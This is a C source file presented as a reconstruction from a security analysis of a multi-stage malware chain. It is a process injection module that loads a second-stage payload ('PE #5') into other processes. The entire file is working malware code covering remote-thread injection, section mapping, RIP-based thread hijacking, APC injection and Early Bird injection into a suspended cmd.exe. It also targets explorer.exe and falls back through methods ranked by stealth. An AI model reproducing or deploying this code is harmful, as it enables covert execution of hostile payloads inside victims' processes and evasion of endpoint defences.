/**
 * PE #4 - Process Injection Module
 * 
 * RECONSTRUCTED FROM SECURITY ANALYSIS
 * Classification: TLP:RED - Security Research Only
 * 
 * This module implements various process injection techniques
 * used to inject PE #5 into target processes.
 * 
 * Injection methods:
 * 1. VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
 * 2. NtCreateSection + NtMapViewOfSection
 * 3. Thread hijacking
 * 4. APC injection
 */

#include "stub.h"
#include "../common/ntdefs.h"

//=============================================================================
// NTDLL FUNCTION POINTERS
//=============================================================================

typedef NTSTATUS (NTAPI *PFN_NtCreateSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle
);

typedef NTSTATUS (NTAPI *PFN_NtMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
);

typedef NTSTATUS (NTAPI *PFN_NtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
);

typedef NTSTATUS (NTAPI *PFN_NtQueueApcThread)(
    HANDLE ThreadHandle,
    PVOID ApcRoutine,
    PVOID ApcRoutineContext,
    PVOID ApcStatusBlock,
    PVOID ApcReserved
);

typedef NTSTATUS (NTAPI *PFN_NtAlertResumeThread)(
    HANDLE ThreadHandle,
    PULONG SuspendCount
);

//=============================================================================
// FUNCTION RESOLUTION
//=============================================================================

static PFN_NtCreateSection          pfnNtCreateSection = NULL;
static PFN_NtMapViewOfSection       pfnNtMapViewOfSection = NULL;
static PFN_NtUnmapViewOfSection     pfnNtUnmapViewOfSection = NULL;
static PFN_NtQueueApcThread         pfnNtQueueApcThread = NULL;
static PFN_NtAlertResumeThread      pfnNtAlertResumeThread = NULL;

static BOOL 
ResolveFunctions(void)
{
    HMODULE hNtdll;
    
    hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (hNtdll == NULL) {
        return FALSE;
    }
    
    pfnNtCreateSection = (PFN_NtCreateSection)
        GetProcAddress(hNtdll, "NtCreateSection");
    pfnNtMapViewOfSection = (PFN_NtMapViewOfSection)
        GetProcAddress(hNtdll, "NtMapViewOfSection");
    pfnNtUnmapViewOfSection = (PFN_NtUnmapViewOfSection)
        GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    pfnNtQueueApcThread = (PFN_NtQueueApcThread)
        GetProcAddress(hNtdll, "NtQueueApcThread");
    pfnNtAlertResumeThread = (PFN_NtAlertResumeThread)
        GetProcAddress(hNtdll, "NtAlertResumeThread");
    
    return (pfnNtCreateSection != NULL);
}

//=============================================================================
// INJECTION METHOD 1: Classic Remote Thread Injection
//=============================================================================

/**
 * Classic injection using VirtualAllocEx + WriteProcessMemory + CreateRemoteThread.
 * 
 * @param hProcess      Target process handle
 * @param PayloadData   Payload to inject
 * @param PayloadSize   Size of payload
 * @param pRemoteBase   Receives remote base address
 * @return              TRUE on success
 */
BOOL 
InjectClassic(
    HANDLE  hProcess,
    PBYTE   PayloadData,
    DWORD   PayloadSize,
    PVOID*  pRemoteBase
)
{
    PVOID remoteBase = NULL;
    SIZE_T bytesWritten = 0;
    
    // Allocate memory in target process
    remoteBase = VirtualAllocEx(
        hProcess,
        NULL,
        PayloadSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (remoteBase == NULL) {
        return FALSE;
    }
    
    // Write payload to target
    if (!WriteProcessMemory(
            hProcess,
            remoteBase,
            PayloadData,
            PayloadSize,
            &bytesWritten)) {
        VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
        return FALSE;
    }
    
    if (pRemoteBase) {
        *pRemoteBase = remoteBase;
    }
    
    return TRUE;
}

/**
 * Execute injected code via CreateRemoteThread.
 */
BOOL 
ExecuteRemoteThread(
    HANDLE  hProcess,
    PVOID   RemoteBase
)
{
    HANDLE hThread;
    DWORD threadId;
    
    hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)RemoteBase,
        NULL,
        0,
        &threadId
    );
    
    if (hThread == NULL) {
        return FALSE;
    }
    
    // Wait for execution
    WaitForSingleObject(hThread, 10000);
    CloseHandle(hThread);
    
    return TRUE;
}

//=============================================================================
// INJECTION METHOD 2: Section Mapping (NtMapViewOfSection)
//=============================================================================

/**
 * Inject using section mapping.
 * 
 * This creates a shared section between our process and target,
 * then maps it with executable permissions.
 * 
 * @param hProcess      Target process handle
 * @param PayloadData   Payload to inject
 * @param PayloadSize   Size of payload
 * @param pRemoteBase   Receives remote base address
 * @return              TRUE on success
 */
BOOL 
InjectSectionMapping(
    HANDLE  hProcess,
    PBYTE   PayloadData,
    DWORD   PayloadSize,
    PVOID*  pRemoteBase
)
{
    HANDLE hSection = NULL;
    PVOID localBase = NULL;
    PVOID remoteBase = NULL;
    SIZE_T viewSize = 0;
    LARGE_INTEGER sectionSize;
    NTSTATUS status;
    
    if (!ResolveFunctions()) {
        return FALSE;
    }
    
    // Create section with RWX permissions
    sectionSize.QuadPart = PayloadSize;
    status = pfnNtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        &sectionSize,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        NULL
    );
    
    if (!NT_SUCCESS(status)) {
        return FALSE;
    }
    
    // Map section into our process (for writing)
    viewSize = PayloadSize;
    status = pfnNtMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &localBase,
        0,
        PayloadSize,
        NULL,
        &viewSize,
        2,  // ViewUnmap
        0,
        PAGE_READWRITE
    );
    
    if (!NT_SUCCESS(status)) {
        CloseHandle(hSection);
        return FALSE;
    }
    
    // Copy payload to local mapping
    CopyMemory(localBase, PayloadData, PayloadSize);
    
    // Map section into target process (for execution)
    viewSize = PayloadSize;
    status = pfnNtMapViewOfSection(
        hSection,
        hProcess,
        &remoteBase,
        0,
        PayloadSize,
        NULL,
        &viewSize,
        2,  // ViewUnmap
        0,
        PAGE_EXECUTE_READ
    );
    
    // Cleanup local mapping
    pfnNtUnmapViewOfSection(GetCurrentProcess(), localBase);
    CloseHandle(hSection);
    
    if (!NT_SUCCESS(status)) {
        return FALSE;
    }
    
    if (pRemoteBase) {
        *pRemoteBase = remoteBase;
    }
    
    return TRUE;
}

//=============================================================================
// INJECTION METHOD 3: Thread Hijacking
//=============================================================================

/**
 * Inject via thread hijacking.
 * 
 * Suspends a thread in the target process, modifies its context
 * to point to our payload, then resumes.
 * 
 * @param hProcess      Target process handle
 * @param hThread       Thread to hijack
 * @param PayloadData   Payload to inject
 * @param PayloadSize   Size of payload
 * @return              TRUE on success
 */
BOOL 
InjectThreadHijack(
    HANDLE  hProcess,
    HANDLE  hThread,
    PBYTE   PayloadData,
    DWORD   PayloadSize
)
{
    PVOID remoteBase = NULL;
    CONTEXT ctx;
    ULONG64 originalRip;
    
    // Suspend target thread
    if (SuspendThread(hThread) == (DWORD)-1) {
        return FALSE;
    }
    
    // Inject payload using classic method
    if (!InjectClassic(hProcess, PayloadData, PayloadSize, &remoteBase)) {
        ResumeThread(hThread);
        return FALSE;
    }
    
    // Get thread context
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &ctx)) {
        ResumeThread(hThread);
        return FALSE;
    }
    
    // Save original RIP
    originalRip = ctx.Rip;
    
    // Modify RIP to point to our payload
    ctx.Rip = (ULONG64)remoteBase;
    
    // Set thread context
    if (!SetThreadContext(hThread, &ctx)) {
        ResumeThread(hThread);
        return FALSE;
    }
    
    // Resume thread (will execute our payload)
    ResumeThread(hThread);
    
    return TRUE;
}

//=============================================================================
// INJECTION METHOD 4: APC Injection
//=============================================================================

/**
 * Inject via Asynchronous Procedure Call (APC).
 * 
 * Queues an APC to a thread in the target process.
 * The APC will execute when the thread enters alertable wait.
 * 
 * @param hProcess      Target process handle
 * @param hThread       Thread to queue APC to
 * @param PayloadData   Payload to inject
 * @param PayloadSize   Size of payload
 * @return              TRUE on success
 */
BOOL 
InjectAPC(
    HANDLE  hProcess,
    HANDLE  hThread,
    PBYTE   PayloadData,
    DWORD   PayloadSize
)
{
    PVOID remoteBase = NULL;
    NTSTATUS status;
    
    if (!ResolveFunctions()) {
        return FALSE;
    }
    
    // Inject payload
    if (!InjectClassic(hProcess, PayloadData, PayloadSize, &remoteBase)) {
        return FALSE;
    }
    
    // Queue APC to thread
    status = pfnNtQueueApcThread(
        hThread,
        remoteBase,
        NULL,
        NULL,
        NULL
    );
    
    if (!NT_SUCCESS(status)) {
        return FALSE;
    }
    
    // Alert thread to process APC
    pfnNtAlertResumeThread(hThread, NULL);
    
    return TRUE;
}

//=============================================================================
// EARLY BIRD INJECTION
//=============================================================================

/**
 * Early Bird injection technique.
 * 
 * Creates a suspended process, injects payload, then queues
 * APC before the process initializes.
 * 
 * @param TargetExe     Path to target executable
 * @param PayloadData   Payload to inject
 * @param PayloadSize   Size of payload
 * @return              TRUE on success
 */
BOOL 
InjectEarlyBird(
    LPCWSTR TargetExe,
    PBYTE   PayloadData,
    DWORD   PayloadSize
)
{
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    PVOID remoteBase = NULL;
    NTSTATUS status;
    
    if (!ResolveFunctions()) {
        return FALSE;
    }
    
    si.cb = sizeof(si);
    
    // Create target process suspended
    if (!CreateProcessW(
            TargetExe,
            NULL,
            NULL,
            NULL,
            FALSE,
            CREATE_SUSPENDED,
            NULL,
            NULL,
            &si,
            &pi)) {
        return FALSE;
    }
    
    // Inject payload
    if (!InjectClassic(pi.hProcess, PayloadData, PayloadSize, &remoteBase)) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }
    
    // Queue APC to main thread (before initialization)
    status = pfnNtQueueApcThread(
        pi.hThread,
        remoteBase,
        NULL,
        NULL,
        NULL
    );
    
    if (!NT_SUCCESS(status)) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }
    
    // Resume process - APC will execute before main()
    ResumeThread(pi.hThread);
    
    // Wait for payload execution
    WaitForSingleObject(pi.hProcess, 10000);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return TRUE;
}

//=============================================================================
// TARGET PROCESS SELECTION
//=============================================================================

/**
 * Find a suitable process for injection.
 * 
 * Looks for a process with appropriate privileges and state.
 * 
 * @param ProcessName   Name of process to find (e.g., "explorer.exe")
 * @param pProcessId    Receives process ID
 * @return              TRUE if found
 */
BOOL 
FindTargetProcess(
    LPCWSTR ProcessName,
    PDWORD  pProcessId
)
{
    HANDLE hSnapshot;
    PROCESSENTRY32W pe32;
    BOOL found = FALSE;
    
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return FALSE;
    }
    
    pe32.dwSize = sizeof(pe32);
    
    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, ProcessName) == 0) {
                if (pProcessId) {
                    *pProcessId = pe32.th32ProcessID;
                }
                found = TRUE;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return found;
}

/**
 * Open process with required access.
 */
HANDLE 
OpenTargetProcess(
    DWORD ProcessId
)
{
    return OpenProcess(
        PROCESS_CREATE_THREAD |
        PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE |
        PROCESS_VM_READ |
        PROCESS_QUERY_INFORMATION,
        FALSE,
        ProcessId
    );
}

//=============================================================================
// HIGH-LEVEL INJECTION FUNCTIONS
//=============================================================================

/**
 * Inject PE #5 using best available method.
 * 
 * Tries injection methods in order of stealth/reliability.
 */
BOOL 
PE4_InjectPE5Advanced(
    PBYTE   PE5Data,
    DWORD   PE5Size
)
{
    DWORD targetPid;
    HANDLE hTarget;
    PVOID remoteBase;
    BOOL success = FALSE;
    
    // First try: Self-injection (simplest)
    success = InjectClassic(
        GetCurrentProcess(),
        PE5Data,
        PE5Size,
        &remoteBase
    );
    
    if (success) {
        return ExecuteRemoteThread(GetCurrentProcess(), remoteBase);
    }
    
    // Second try: Inject into explorer.exe
    if (FindTargetProcess(L"explorer.exe", &targetPid)) {
        hTarget = OpenTargetProcess(targetPid);
        if (hTarget != NULL) {
            success = InjectSectionMapping(hTarget, PE5Data, PE5Size, &remoteBase);
            if (success) {
                ExecuteRemoteThread(hTarget, remoteBase);
            }
            CloseHandle(hTarget);
        }
    }
    
    // Third try: Early bird into cmd.exe
    if (!success) {
        success = InjectEarlyBird(
            L"C:\\Windows\\System32\\cmd.exe",
            PE5Data,
            PE5Size
        );
    }
    
    return success;
}
